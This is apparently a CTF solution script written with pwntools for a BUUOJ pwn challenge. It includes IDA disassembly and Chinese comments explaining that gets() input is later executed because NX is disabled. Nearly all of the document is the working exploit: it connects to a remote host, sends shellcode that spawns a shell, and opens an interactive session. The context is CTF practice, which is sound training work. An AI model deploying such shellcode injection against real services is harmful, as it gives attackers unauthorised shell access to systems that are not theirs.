from pwn import *

r = remote('node5.buuoj.cn', 29453)
context.log_level = 'debug'
context.arch = 'i386'

'''
# vul
.text:0804887C 000                 push    ebp
.text:0804887D 004                 mov     ebp, esp
.text:0804887F 004                 sub     esp, 8
.text:08048882 00C                 sub     esp, 0Ch
.text:08048885 018                 push    [ebp+arg_0]
.text:08048888 01C                 call    gets
.text:0804888D 01C                 add     esp, 10h
.text:08048890 00C                 sub     esp, 0Ch
.text:08048893 018                 push    [ebp+arg_0]
.text:08048896 01C                 call    puts
.text:0804889B 01C                 add     esp, 10h
.text:0804889E 00C                 nop
.text:0804889F 00C                 leave
.text:080488A0 000                 retn

# main
text:080488E8 0B8                 push    offset aEnterAString ; "Enter a string!"
.text:080488ED 0BC                 call    puts
.text:080488F2 0BC                 add     esp, 10h
.text:080488F5 0AC                 sub     esp, 0Ch
.text:080488F8 0B8                 lea     eax, [ebp+var_A0]
.text:080488FE 0B8                 push    eax
.text:080488FF 0BC                 call    vuln
.text:08048904 0BC                 add     esp, 10h
.text:08048907 0AC                 sub     esp, 0Ch
.text:0804890A 0B8                 push    offset aThanksExecutin ; "Thanks! Executing now..."
.text:0804890F 0BC                 call    puts
.text:08048914 0BC                 add     esp, 10h
.text:08048917 0AC                 lea     eax, [ebp+var_A0]
.text:0804891D 0AC                 call    eax
.text:0804891F 0AC                 mov     eax, 0
.text:08048924 0AC                 mov     ecx, [ebp+var_4]
.text:08048927 0AC                 leave
'''
# ida无法F5，查看汇编代码：在vul函数中gets函数输入到[ebp+arg_0]参数中，而main函数中传入的函数是[ebp+var_A0]，后面会call eax->[ebp+var_A0]
# 总结就是，gets输入的东西，会在main函数的最后执行。程序没有开nx保护，直接输入shellcode执行。
payload = asm(shellcraft.sh())
r.sendlineafter(b'string!', payload)
r.interactive()
